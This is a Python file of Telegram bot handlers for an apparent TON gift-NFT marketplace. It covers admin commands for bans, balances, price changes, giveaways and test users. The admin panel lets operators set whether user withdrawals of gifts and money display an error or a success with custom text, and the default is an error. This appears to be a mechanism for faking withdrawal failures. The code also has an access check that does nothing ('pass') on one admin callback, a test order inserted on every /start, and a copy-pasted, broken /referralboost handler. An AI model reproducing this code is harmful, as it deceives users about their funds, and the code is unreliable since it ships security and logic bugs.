import re

from aiogram import F, Router
from aiogram.filters import Command, CommandStart
from aiogram.types import Message, CallbackQuery
from aiogram.types.input_file import FSInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

from datetime import datetime, timedelta, timezone

from src.application.common.const import GiveawayType
from src.application.common.utils import generate_gifts, get_give_img, generate_random_id, build_direct_link, dict2obj
from src.application.dto.giveaway import CreateGiveawayDTO
from src.entrypoint.config import Config
from src.presentation.bot.keyboards.base import menu_kb, admin_kb, admin_gift_kb, admin_settings_kb, admin_settings_withdraw_gift_kb, admin_settings_withdraw_gift_change_type_kb, giveaway_kb, admin_back
from src.presentation.bot.keyboards.base import admin_settings_withdraw_money_change_type_kb, admin_settings_withdraw_money_kb
from src.presentation.bot.services import market, text, user
from src.presentation.bot.services.text import get_admin_text
from src.presentation.bot.handlers.states import StatesAdminSearchGift, StatesAdminSearchGiftEdit, StatesAdminSettingsWithdrawGift, StatesAdminSettingsWithdrawMoney, StatesAdminSettingsEditGiftPrices
from src.infrastructure.gateways.settings import SettingsGateway
from src.infrastructure.gateways.market import MarketGateway
from src.infrastructure.database.session import new_session_maker

from src.application.common.utils import calculate_gift_rarity
from src.domain.entities.market import CreateOrderDM
from src.presentation.bot.services.market import create_order

router = Router()
config = Config()


async def test_save_gift(
    gift_id: int,
    user_id: int,
    number: int,
    type: str,
    pattern: float,
    model: float,
    background: float,
    pattern_name: str,
    model_name: str,
    background_name: str,
    price: float = 0.0,
) -> None:
    order_data = CreateOrderDM(
        gift_id=gift_id,
        seller_id=user_id,
        number=number if number else 0,
        type=type,
        pattern=pattern,
        model=model,
        background=background,
        pattern_name=pattern_name,
        model_name=model_name,
        background_name=background_name,
        rarity=calculate_gift_rarity(model),
        is_active=True,
        price=price,
    )
    await create_order(order_data, config.postgres)


@router.message(CommandStart())
async def start_handler(message: Message, config: Config) -> None:
    file_path = "src/media/start.webp"
    await message.answer_photo(
        photo=FSInputFile(file_path),
        caption=text.get_start_text(),
        reply_markup=menu_kb(config.bot.WEBAPP_URL)
    )

    session_maker = new_session_maker(config.postgres)
    async with session_maker() as session:
        settings_gateway = SettingsGateway(session=session)
        try:
            admin_gift_settings = await settings_gateway.get_one()
            print(admin_gift_settings)
        except Exception as e:
            await settings_gateway.save({
                "withdraw_gift_type": "withdraw_error",
                "withdraw_gift_text": "There was an error when displaying the gift, try again later!",
                "withdraw_money_type": "withdraw_error",
                "withdraw_money_text": "There was an error when withdrawing funds, try again later!"
            })

    await test_save_gift(
        gift_id=3,
        user_id=message.from_user.id,
        number=1711,
        type="Heart Locket",
        pattern=0.4,
        model=1.5,
        background=1.2,
        model_name="Casino Bugs",
        pattern_name="Lovely Rain",
        background_name="Mexican Pink",
        price=23.2
    )


@router.message(Command("admin"))
async def admin_handler(message: Message, config: Config) -> None:
    if message.from_user.id not in config.bot.moderators_chat_id:
        return
    
    count_users = await user.get_count_users(config.postgres)
    total_count, completed_count, active_count = await market.get_count_gifts(config.postgres)
    trading_volume = await market.get_total_trading_volume(config.postgres)
    total_balance = await user.get_total_balance(config.postgres)

    nest_gifter_balance = 0.0
    if hasattr(config.bot, 'NEST_GIFTER_ID'):
        nest_gifter_balance = await user.get_user_balance(config.postgres, config.bot.GIFTER_ID)
    else:
        print("Warning: config.bot.GIFTER_ID is not defined for admin panel.")

    admin_panel_url = f"{config.bot.WEBAPP_API_URL}/admin/ciuerynwi7yr4"

    await message.answer(
        text.get_admin_text(
            count_users=count_users,
            count_all_gifts=total_count,
            count_completed_gifts=completed_count,
            count_active_gifts=active_count,
            trading_volume=trading_volume,
            total_balance=total_balance,
            nest_gifter_balance=nest_gifter_balance
        ),
        reply_markup=admin_kb(admin_panel_url)
    )


@router.callback_query(F.data.startswith("admin:"))
async def withdraw_gift_callback(callback_query: CallbackQuery, config: Config, state: FSMContext) -> None:
    if callback_query.from_user.id not in config.bot.moderators_chat_id:
        pass
    
    try:
        data = callback_query.data.split(":")[1]

        if data == "search_gift":
            await callback_query.message.edit_text(
                text="<b>🔍 Поиск подарка</b>\n\n Введите ID подарка:",
                reply_markup=admin_back()
            )
            await state.set_state(StatesAdminSearchGift.gift_id)

        elif data == "settings":
            await callback_query.message.edit_text(
                text="<b>⚙️ Настройки проекта</b>\n\n Выберите опцию для изменения:",
                reply_markup=admin_settings_kb()
            )

    except Exception as e:
        print(e)


@router.message(StatesAdminSearchGift.gift_id)
async def receive_new_text(message: Message, state: FSMContext, config: Config):
    if message.from_user.id not in config.bot.moderators_chat_id:
        return await message.answer("⛔ Нет доступа")
    
    if not message.text.isdigit():
        await message.answer(
            "❌ Неверный формат команды",
            reply_markup=admin_back()
        )
    else:

        session_maker = new_session_maker(config.postgres)
        async with session_maker() as session:
            market_gateway = MarketGateway(session=session)
            gift = await market_gateway.get_one(id=int(message.text))

        if not gift:
            await message.answer(
                "❌ Подарок не найден",
                reply_markup=admin_back()
            )

        giftLink = f"https://t.me/nft/{gift.type.replace(' ', '').replace('-', '')}-{gift.number}"

        await message.answer(
            f"<b>🎁 Подарок #{gift.id} найден</b>\n\n"
            f"<b>Владелец:</b> <code>{gift.seller_id}</code>\n\n"
            f"<b>Тип:</b> {gift.type}\n"
            f"<b>Номер:</b> #{gift.number}\n"
            f"<b>Цена:</b> {round(gift.price, 2)} TON\n\n"
            f"<b>Модель:</b> {gift.model_name} (x{gift.model})\n"
            f"<b>Узор:</b> {gift.pattern_name} (x{gift.pattern})\n"
            f"<b>Фон:</b> {gift.background_name} (x{gift.background})\n\n"
            f"{giftLink}",
            reply_markup=admin_gift_kb(gift.id)
        )
        await state.clear()


@router.callback_query(F.data.startswith("admin_gift:"))
async def show_withdraw_gift_settings(callback: CallbackQuery, config: Config, state: FSMContext):
    if callback.from_user.id not in config.bot.moderators_chat_id:
        return await callback.answer("⛔ Нет доступа", show_alert=True)
    
    data = callback.data.split(":")[1]

    if data == "edit_price":
        gift_id = int(callback.data.split(":")[2])

        await callback.message.edit_text(
            "<b>✍️ Введите новую цену подарка</b>\n\nВведите цену в TON:"
        )

        await state.set_state(StatesAdminSearchGiftEdit.gift_price)
        await state.update_data(gift_id=gift_id)


@router.message(StatesAdminSearchGiftEdit.gift_price)
async def receive_new_text(message: Message, state: FSMContext, config: Config):
    if message.from_user.id not in config.bot.moderators_chat_id:
        return await message.answer("⛔ Нет доступа")
    
    try:
        stateData = await state.get_data()
        stateGiftId = stateData["gift_id"]

        value = float(message.text.strip())
        if value <= 0:
            await message.answer(
                "❌ Неверный формат команды",
                reply_markup=admin_back()
            )

        session_maker = new_session_maker(config.postgres)
        async with session_maker() as session:
            market_gateway = MarketGateway(session=session)
            await market_gateway.edit_gift_price(gift_id=stateGiftId, price=value)

        await message.answer(
            "<b>✅ Цена успешно изменена</b>\n\nПодарок теперь стоит " + str(value) + " TON",
            reply_markup=admin_back()
        )
    except ValueError:
        await message.answer(
            "❌ Неверный формат команды",
            reply_markup=admin_back()
        )


@router.callback_query(F.data == "admin_settings:edit_gift_prices")
async def show_withdraw_gift_settings(callback: CallbackQuery, config: Config, state: FSMContext):
    if callback.from_user.id not in config.bot.moderators_chat_id:
        return await callback.answer("⛔ Нет доступа", show_alert=True)

    await callback.message.edit_text(
        "<b>🕹 Изменить цены всех подарков</b>\n\nВведите процент (+10, -10):"
    )

    await state.set_state(StatesAdminSettingsEditGiftPrices.edit_price)


@router.message(StatesAdminSettingsEditGiftPrices.edit_price)
async def receive_new_text(message: Message, state: FSMContext, config: Config):
    if message.from_user.id not in config.bot.moderators_chat_id:
        return await message.answer("⛔ Нет доступа")
    
    if not message.text.startswith("+") and not message.text.startswith("-"):
        await message.answer(
            "❌ Неверный формат команды",
            reply_markup=admin_back()
        )

    if message.text.startswith("+"):
        amount = int(message.text.split("+")[1])
        await state.clear()

        session_maker = new_session_maker(config.postgres)
        async with session_maker() as session:
            market_gateway = MarketGateway(session=session)
            await market_gateway.edit_gift_prices(percent=amount)

        await message.answer(
            "<b>✅ Цена успешно изменена</b>\n\nВсе подарки повышены в цене на " + str(amount) + "%",
            reply_markup=admin_back()
        )
    
    if message.text.startswith("-"):
        amount = int(message.text.split("-")[1])
        await state.clear()

        session_maker = new_session_maker(config.postgres)
        async with session_maker() as session:
            market_gateway = MarketGateway(session=session)
            await market_gateway.edit_gift_prices(percent=-amount)

        await message.answer(
            "<b>✅ Цена успешно изменена</b>\n\nВсе подарки понижены в цене на " + str(amount) + "%",
            reply_markup=admin_back()
        )


@router.callback_query(F.data == "admin_settings:withdraw_gift")
async def show_withdraw_gift_settings(callback: CallbackQuery, config: Config):
    if callback.from_user.id not in config.bot.moderators_chat_id:
        return await callback.answer("⛔ Нет доступа", show_alert=True)

    newType = "Не настроено"
    newText = "Не настроено"

    session_maker = new_session_maker(config.postgres)
    async with session_maker() as session:
        settings_gateway = SettingsGateway(session=session)
        admin_gift_settings = await settings_gateway.get_one()

    if admin_gift_settings.withdraw_gift_type == "withdraw_error":
        newType = "Ошибка вывода 🚫"
        newText = admin_gift_settings.withdraw_gift_text
    elif admin_gift_settings.withdraw_gift_type == "withdraw_success":
        newType = "Вывод успешен ✅"
        newText = admin_gift_settings.withdraw_gift_text
    
    await callback.message.edit_text(
        f"<b>🎁 Вывод подарка</b>\n\n"
        f"<b>Тип:</b> {newType}\n"
        f"<b>Текст:</b> {newText}\n\n"
        f"<i>Вы можете изменить тип и текст по кнопкам ниже</i>",
        reply_markup=admin_settings_withdraw_gift_kb()
    )


@router.callback_query(F.data == "admin_settings:withdraw_money")
async def show_withdraw_money_settings(callback: CallbackQuery, config: Config):
    if callback.from_user.id not in config.bot.moderators_chat_id:
        return await callback.answer("⛔ Нет доступа", show_alert=True)

    newType = "Не настроено"
    newText = "Не настроено"

    session_maker = new_session_maker(config.postgres)
    async with session_maker() as session:
        settings_gateway = SettingsGateway(session=session)
        admin_money_settings = await settings_gateway.get_one()

    if admin_money_settings.withdraw_money_type == "withdraw_error":
        newType = "Ошибка вывода 🚫"
        newText = admin_money_settings.withdraw_money_text
    elif admin_money_settings.withdraw_money_type == "withdraw_success":
        newType = "Вывод успешен ✅"
        newText = admin_money_settings.withdraw_money_text
    
    await callback.message.edit_text(
        f"<b>💰 Вывод средств</b>\n\n"
        f"<b>Тип:</b> {newType}\n"
        f"<b>Текст:</b> {newText}\n\n"
        f"<i>Вы можете изменить тип и текст по кнопкам ниже</i>",
        reply_markup=admin_settings_withdraw_money_kb()
    )


@router.callback_query(F.data == "admin_settings:back")
async def show_withdraw_money_settings(callback: CallbackQuery, config: Config, state: FSMContext):
    await state.clear()

    count_users = await user.get_count_users(config.postgres)
    total_count, completed_count, active_count = await market.get_count_gifts(config.postgres)
    trading_volume = await market.get_total_trading_volume(config.postgres)
    total_balance = await user.get_total_balance(config.postgres)

    nest_gifter_balance = 0.0
    if hasattr(config.bot, 'NEST_GIFTER_ID'):
        nest_gifter_balance = await user.get_user_balance(config.postgres, config.bot.GIFTER_ID)
    else:
        print("Warning: config.bot.GIFTER_ID is not defined for admin panel.")

    admin_panel_url = f"{config.bot.WEBAPP_API_URL}/admin/ciuerynwi7yr4"

    await callback.message.edit_text(
        text.get_admin_text(
            count_users=count_users,
            count_all_gifts=total_count,
            count_completed_gifts=completed_count,
            count_active_gifts=active_count,
            trading_volume=trading_volume,
            total_balance=total_balance,
            nest_gifter_balance=nest_gifter_balance
        ),
        reply_markup=admin_kb(admin_panel_url)
    )


@router.callback_query(F.data == "admin_settings_withdraw_gift:change_type")
async def ask_change_type(callback: CallbackQuery, config: Config):
    if callback.from_user.id not in config.bot.moderators_chat_id:
        return await callback.answer("⛔ Нет доступа", show_alert=True)

    await callback.message.edit_text(
        "<b>♻️ Изменить тип вывода подарка</b>\n\nВыберите новый тип:",
        reply_markup=admin_settings_withdraw_gift_change_type_kb()
    )


@router.callback_query(F.data == "admin_settings_withdraw_money:change_type")
async def ask_change_type(callback: CallbackQuery, config: Config):
    if callback.from_user.id not in config.bot.moderators_chat_id:
        return await callback.answer("⛔ Нет доступа", show_alert=True)

    await callback.message.edit_text(
        "<b>♻️ Изменить тип вывода средств</b>\n\nВыберите новый тип:",
        reply_markup=admin_settings_withdraw_money_change_type_kb()
    )


@router.callback_query(F.data == "admin_settings_withdraw_gift:back")
async def show_withdraw_money_settings(callback: CallbackQuery, config: Config):
    await callback.message.edit_text(
        text="<b>⚙️ Настройки проекта</b>\n\n Выберите опцию для изменения:",
        reply_markup=admin_settings_kb()
    )


@router.callback_query(F.data == "admin_settings_withdraw_money:back")
async def show_withdraw_money_settings(callback: CallbackQuery, config: Config):
    await callback.message.edit_text(
        text="<b>⚙️ Настройки проекта</b>\n\n Выберите опцию для изменения:",
        reply_markup=admin_settings_kb()
    )


@router.callback_query(F.data.startswith("admin_settings_withdraw_gift_change_type:"))
async def change_type(callback: CallbackQuery, config: Config):
    if callback.from_user.id not in config.bot.moderators_chat_id:
        return await callback.answer("⛔ Нет доступа", show_alert=True)

    action = callback.data.split(":")[1]

    if action == "error":
        changedType = "Ошибка вывода 🚫"
        await callback.answer("✅ Тип изменён")
    elif action == "success":
        changedType = "Вывод успешен ✅"
        await callback.answer("✅ Тип изменён")
    elif action == "back":
        return await show_withdraw_gift_settings(callback, config)
    else:
        return await callback.answer("⚠️ Неизвестный тип", show_alert=True)

    session_maker = new_session_maker(config.postgres)
    async with session_maker() as session:
        settings_gateway = SettingsGateway(session=session)

        if changedType == "Вывод успешен ✅":
            newType = "withdraw_success"
        elif changedType == "Ошибка вывода 🚫":
            newType = "withdraw_error"

        await settings_gateway.save({
            "withdraw_gift_type": newType
        })
    
    await show_withdraw_gift_settings(callback, config)


@router.callback_query(F.data.startswith("admin_settings_withdraw_money_change_type:"))
async def change_type(callback: CallbackQuery, config: Config):
    if callback.from_user.id not in config.bot.moderators_chat_id:
        return await callback.answer("⛔ Нет доступа", show_alert=True)

    action = callback.data.split(":")[1]

    if action == "error":
        changedType = "Ошибка вывода 🚫"
        await callback.answer("✅ Тип изменён")
    elif action == "success":
        changedType = "Вывод успешен ✅"
        await callback.answer("✅ Тип изменён")
    elif action == "back":
        return await show_withdraw_money_settings(callback, config)
    else:
        return await callback.answer("⚠️ Неизвестный тип", show_alert=True)

    session_maker = new_session_maker(config.postgres)
    async with session_maker() as session:
        settings_gateway = SettingsGateway(session=session)

        if changedType == "Вывод успешен ✅":
            newType = "withdraw_success"
        elif changedType == "Ошибка вывода 🚫":
            newType = "withdraw_error"

        await settings_gateway.save({
            "withdraw_money_type": newType
        })
    
    await show_withdraw_money_settings(callback, config)


@router.callback_query(F.data == "admin_settings_withdraw_gift:change_text")
async def ask_change_text(callback: CallbackQuery, state: FSMContext, config: Config):
    if callback.from_user.id not in config.bot.moderators_chat_id:
        return await callback.answer("⛔ Нет доступа", show_alert=True)

    await callback.message.edit_text(
        "<b>✍️ Введите новый текст уведомления:</b>",
        parse_mode="HTML"
    )
    await state.set_state(StatesAdminSettingsWithdrawGift.edit_text)


@router.callback_query(F.data == "admin_settings_withdraw_money:change_text")
async def ask_change_text(callback: CallbackQuery, state: FSMContext, config: Config):
    if callback.from_user.id not in config.bot.moderators_chat_id:
        return await callback.answer("⛔ Нет доступа", show_alert=True)

    await callback.message.edit_text(
        "<b>✍️ Введите новый текст уведомления:</b>",
        parse_mode="HTML"
    )
    await state.set_state(StatesAdminSettingsWithdrawMoney.edit_text)


@router.message(StatesAdminSettingsWithdrawGift.edit_text)
async def receive_new_text(message: Message, state: FSMContext, config: Config):
    if message.from_user.id not in config.bot.moderators_chat_id:
        return await message.answer("⛔ Нет доступа")

    if not message.text:
        return await message.answer("❌ Не указан текст вывода")

    await state.clear()

    session_maker = new_session_maker(config.postgres)
    async with session_maker() as session:
        settings_gateway = SettingsGateway(session=session)

        await settings_gateway.save({
            "withdraw_gift_text": message.text
        })

    await message.answer("✅ Текст успешно изменен!")

    session_maker = new_session_maker(config.postgres)
    async with session_maker() as session:
        settings_gateway = SettingsGateway(session=session)
        admin_gift_settings = await settings_gateway.get_one()

    if admin_gift_settings.withdraw_gift_type == "withdraw_error":
        newType = "Ошибка вывода 🚫"
    elif admin_gift_settings.withdraw_gift_type == "withdraw_success":
        newType = "Вывод успешен ✅"

    await message.answer(
        f"<b>🎁 Вывод подарка</b>\n\n"
        f"<b>Тип:</b> {newType}\n"
        f"<b>Текст:</b> {admin_gift_settings.withdraw_gift_text}\n\n"
        f"<i>Вы можете изменить тип и текст по кнопкам ниже</i>",
        reply_markup=admin_settings_withdraw_gift_kb()
    )


@router.message(StatesAdminSettingsWithdrawMoney.edit_text)
async def receive_new_text(message: Message, state: FSMContext, config: Config):
    if message.from_user.id not in config.bot.moderators_chat_id:
        return await message.answer("⛔ Нет доступа")

    if not message.text:
        return await message.answer("❌ Не указан текст вывода")

    await state.clear()

    session_maker = new_session_maker(config.postgres)
    async with session_maker() as session:
        settings_gateway = SettingsGateway(session=session)

        await settings_gateway.save({
            "withdraw_money_text": message.text
        })

    await message.answer("✅ Текст успешно изменен!")

    session_maker = new_session_maker(config.postgres)
    async with session_maker() as session:
        settings_gateway = SettingsGateway(session=session)
        admin_money_settings = await settings_gateway.get_one()

    if admin_money_settings.withdraw_money_type == "withdraw_error":
        newType = "Ошибка вывода 🚫"
    elif admin_money_settings.withdraw_money_type == "withdraw_success":
        newType = "Вывод успешен ✅"

    await message.answer(
        f"<b>💰 Вывод средств</b>\n\n"
        f"<b>Тип:</b> {newType}\n"
        f"<b>Текст:</b> {admin_money_settings.withdraw_money_text}\n\n"
        f"<i>Вы можете изменить тип и текст по кнопкам ниже</i>",
        reply_markup=admin_settings_withdraw_money_kb()
    )


@router.message(Command("giveaway"))
async def giveaway_handler(message: Message, config: Config) -> None:
    if message.from_user.id not in config.bot.moderators_chat_id:
        return await message.answer("❌ This command is only for moderators.")

    try:
        # Parse the command format: /giveaway gift_id1,gift_id2 channel1,channel2 duration(hours) quantity
        # Example: /giveaway 1,2,3 nestdex_official 24 100
        args = message.text.split(" ")[1:]
        if len(args) < 3:
            return await message.answer(
                "❌ Invalid command format.\n"
                "Use: /giveaway gift_id1,gift_id2,... channel1,channel2,... duration_hours [quantity=0] [is_premium=0]"
            )

        # Parse gift IDs
        gift_ids = [int(id) for id in args[0].split(",")]

        # Parse channel usernames
        channels = args[1].split(",")

        # Parse duration in hours
        duration_hours = int(args[2])
        end_time = datetime.now(tz=timezone.utc) + timedelta(hours=duration_hours)

        # Parse optional quantity (0 means unlimited)
        quantity = 0
        if len(args) > 3:
            quantity = int(args[3])

        # Parse optional premium flag
        is_premium = False
        is_end = False
        is_type = GiveawayType.SUBSCRIPTION

        if len(args) > 4:
            is_premium = bool(int(args[4]))

        if len(args) > 5:
            is_end = bool(int(args[5]))

        # Create a giveaway data object
        giveaway_data = CreateGiveawayDTO(
            type=is_type,
            gifts_ids=gift_ids,
            channels_usernames=channels,
            quantity_members=quantity,
            end_time=end_time,
            price=0.0,  # Free giveaway
            is_premium=is_premium,
            participants_ids=[],
            winners_ids=[],
            referrers_ids=[]
        )

        # Check if gifts exist and belong to the user
        gifts = generate_gifts(gift_ids[0], message.from_user.id)
        if not gifts:
            return await message.answer("❌ The specified gifts don't exist or don't belong to you.")
        u = build_direct_link('a','b')
        # Create a user-friendly display of the giveaway
        channel_usernames = [f"@{channel}" for channel in channels]
        giveaway_obj = dict2obj(giveaway_data.__dict__)
        giveaway_obj.tickets = 0

        if len(args) > 7:
            giveaway_obj.tickets = str(args[7])

        giveaway_text = text.get_giveaway_text(giveaway_obj, gifts, channel_usernames, u)
        if is_end:
            giveaway_text = text.get_ended_giveaway_text(
                giveaway_obj, gifts, channel_usernames, u
            )

        count_gifts = len(gifts)
        file_path = get_give_img(count_gifts, giveaway_data.type)

        await message.answer_photo(
            photo=FSInputFile(file_path),
            caption=f"{giveaway_text}\n\n"
                    "This is a preview, "
                    "please use the web interface which provides full functionality.",
            reply_markup=giveaway_kb(u, 'a', 1, 2)
        )
    except (ValueError, IndexError) as e:
        await message.answer(
            f"❌ Error parsing command: {str(e)}\n"
            "Use: /giveaway gift_id1,gift_id2,... channel1,channel2,... duration_hours [quantity=0] [is_premium=0]"
        )


@router.message(F.text.startswith("/user"))
async def user_info_handler(message: Message, config: Config) -> Message | None:
    if message.from_user.id not in config.bot.moderators_chat_id:
        return
    try:
        user_id = int(message.text.split("/user")[1].strip())
    except ValueError:
        return await message.answer(
            "❌ Неверный формат команды.\nОтправь команду в формате <code>/user [user id]</code>"
        )
    if not (user_info := await user.get_full_user_info(config.postgres, user_id)):
        return await message.answer(f"✅ Пользователь #{user_id} заблокирован")
    await message.answer(text.get_full_user_info_text(user_info))


@router.message(F.text.startswith("/ban"))
async def ban_handler(message: Message, config: Config) -> Message | None:
    if message.from_user.id not in config.bot.moderators_chat_id:
        return
    try:
        user_id = int(message.text.split("/ban")[1].strip())
    except ValueError:
        return await message.answer(
            "❌ Неверный формат команды.\nОтправь команду в формате <code>/ban [user id]</code>"
        )
    if await user.ban_user(config.postgres, user_id):
        return await message.answer(f"✅ Пользователь #{user_id} заблокирован")
    await message.answer(f"❌ Пользователь с id {user_id} не найден")


@router.message(F.text.startswith("/unban"))
async def unban_handler(message: Message, config: Config) -> Message | None:
    if message.from_user.id not in config.bot.moderators_chat_id:
        return
    try:
        user_id = int(message.text.split("/unban")[1].strip())
    except ValueError:
        return await message.answer(
            "❌ Неверный формат команды.\nОтправь команду в формате <code>/unban [user id]</code>"
        )
    if await user.unban_user(config.postgres, user_id):
        return await message.answer(f"✅ Пользователь #{user_id} разблокирован")
    await message.answer(f"❌ Пользователь с id {user_id} не найден")


@router.message(F.text.startswith("/addbalance"))
async def add_balance_handler(message: Message, config: Config) -> Message | None:
    if message.from_user.id not in config.bot.moderators_chat_id:
        return
    try:
        user_id, amount = message.text.split("/addbalance")[1].split()
        user_id, amount = int(user_id), float(amount)
    except ValueError:
        return await message.answer(
            "❌ Неверный формат команды."
            "\nОтправь команду в формате <code>/addbalance [user id] [amount]</code>"
        )
    if await user.add_balance_user(config.postgres, user_id, amount):
        return await message.answer(f"✅ Баланс пользователю #{user_id} пополнен на {amount} TON")
    await message.answer(f"❌ Пользователь с id {user_id} не найден")


@router.message(F.text.startswith("/order"))
async def order_info_handler(message: Message, config: Config) -> Message | None:
    if message.from_user.id not in config.bot.moderators_chat_id:
        return
    try:
        gift_type, gift_number = message.text.split("/order")[1].split()
        gift_number = int(gift_number)
    except ValueError:
        return await message.answer(
            "❌ Неверный формат команды.\n"
            "Отправь команду в формате <code>/order [gift_type] [gift number]</code>"
        )

    if not (orders := await market.get_orders_info(gift_type.upper(), gift_number, config.postgres)):
        return await message.answer(f"❌ Ордер {gift_type} - #{gift_number} не найден")
    answer_text = ""
    for order in orders:
        answer_text += f"{text.get_order_info_text(order)}\n\n"
        if order.id != orders[-1].id:
            answer_text += "-" * 60 + "\n\n"
    await message.answer(answer_text.strip())


@router.message(F.text.startswith("/delete"))
async def delete_order_handler(message: Message, config: Config) -> Message | None:
    if message.from_user.id not in config.bot.moderators_chat_id:
        return
    try:
        order_id = int(message.text.split("/delete")[1].strip())
    except ValueError:
        return await message.answer(
            "❌ Неверный формат команды.\nОтправь команду в формате <code>/delete [order id]</code>"
        )

    if await market.delete_order(order_id, config.postgres):
        return await message.answer(f"✅ Ордер с ID {order_id} удалён")
    await message.answer(f"❌ Ордер с ID {order_id} не найден")


@router.message(F.text.startswith("/referralboost"))
async def referral_boost_order_handler(message: Message, config: Config) -> Message | None:
    if message.from_user.id not in config.bot.moderators_chat_id:
        return
    try:
        user_id, amount = message.text.split("/addbalance")[1].split()
        user_id, amount = int(user_id), float(amount)
    except ValueError:
        return await message.answer(
            "❌ Неверный формат команды."
            "\nОтправь команду в формате <code>/addbalance [user id] [amount]</code>"
        )
    if await user.add_balance_user(config.postgres, user_id, amount):
        return await message.answer(f"✅ Баланс пользователю #{user_id} пополнен на {amount} TON")
    await message.answer(f"❌ Пользователь с id {user_id} не найден")


@router.message(F.text.startswith("/setreferral_percent"))
async def set_referral_percent_handler(message: Message, config: Config) -> Message | None:
    if message.from_user.id not in config.bot.moderators_chat_id:
        return
    try:
        user_id, percent = message.text.split("/setreferral_percent")[1].split()
        user_id, percent = int(user_id), int(percent)
        
        # Check if percentage is valid
        if percent < 0 or percent > 100:
            return await message.answer(
                f"❌ Недопустимый процент. Допустимый диапазон: от 0 до {100}%"
            )
    except ValueError:
        return await message.answer(
            "❌ Неверный формат команды."
            f"\nОтправь команду в формате <code>/setreferral_percent [user id] [percent]</code>, где percent от 0 до {100}"
        )
    
    if await user.set_custom_referral_percent(config.postgres, user_id, percent):
        return await message.answer(f"✅ Пользователю #{user_id} установлен процент реферальных вознаграждений: {percent}%")
    await message.answer(f"❌ Пользователь с id {user_id} не найден")


@router.message(Command(re.compile(r'^(addGift|sellGift)')))
async def add_gift_handler(message: Message, config: Config) -> Message | None:
    if config.tonapi.IS_TESTNET:
        if message.from_user.id not in config.bot.moderators_chat_id:
            return
        try:
            user_id = int(re.split(r'^/(addGift|sellGift)', message.text)[2].strip())
        except ValueError:
            return await message.answer(
                "❌ Неверный формат команды.\nОтправь команду в формате <code>/addGift [user id]</code>"
            )

        if await market.create_gift_for_user(user_id, config.postgres, message.text.startswith('/sellGift')):
            return await message.answer(f"✅ 10 gifts создан для пользователя #{user_id}")
        return await message.answer(f"❌ Ошибка при создании подарка для пользователя {user_id}")
    await message.answer(f"❌ Ошибка при создании подарка для пользователя {user_id}. Только для дева")


@router.message(Command("create_test_user"))
async def create_test_user_handler(message: Message, config: Config) -> None:
    if config.tonapi.IS_TESTNET:
        if message.from_user.id not in config.bot.moderators_chat_id:
            return await message.answer("❌ This command is only for moderators.")
        l = 1
        try:
            l = int(re.split(r'^/(create_test_user|sellGift)', message.text)[2].strip())
        except:
            pass
        u = None
        try:
            for i in range(l):
                # print(i)
                rand = generate_random_id();
                # Create a test user with mock data
                test_user_data = {
                    "id": rand,  # Example test user ID
                    "username": f"test_user{rand}",
                    "first_name": f"Test{rand}",
                    "deposit_comment": f"test{rand}",
                    "balance": 1000.0,
                    "is_banned": False,
                    "created_at": datetime.now(tz=timezone.utc),
                }
                u = await user.create_test_user(config.postgres, test_user_data)
                # Save the test user to the database
                # if u:
                #     return await message.answer(f"✅ Test user created successfully:\n\n"
                #                                 f"ID: {test_user_data['id']}\n"
                #                                 f"Username: {test_user_data['username']}\n"
                #                                 f"Balance: {test_user_data['balance']} TON")
                # else:
                #     return await message.answer("❌ Failed to create the test user.")
            if u:
                return await message.answer(f"✅ Test user created successfully:\n\n"
                                            f"ID: {test_user_data['id']}\n"
                                            f"Username: {test_user_data['username']}\n"
                                            f"Balance: {test_user_data['balance']} TON")
            else:
                return await message.answer("❌ Failed to create the test user.")
        except Exception as e:
            await message.answer(f"❌ An error occurred while creating the test user: {str(e)}")
    await message.answer(f"❌ Ошибка при создании пользователя. Только для дева")


@router.message(Command("fill_participants"))
async def create_test_user_handler(message: Message, config: Config) -> None:
    if config.tonapi.IS_TESTNET:
        if message.from_user.id not in config.bot.moderators_chat_id:
            return await message.answer("❌ This command is only for moderators.")
        try:
            g_id = int(re.split(r'^/(fill_participants|sellGift)', message.text)[2].strip())
            await market.create_give_fill(config.postgres, g_id)
            return await message.answer("ok")
        except Exception as e:
            await message.answer(f"❌ An error occurred while creating fill: {str(e)}")
    await message.answer(f"❌ Ошибка при создании пользователя. Только для дева")
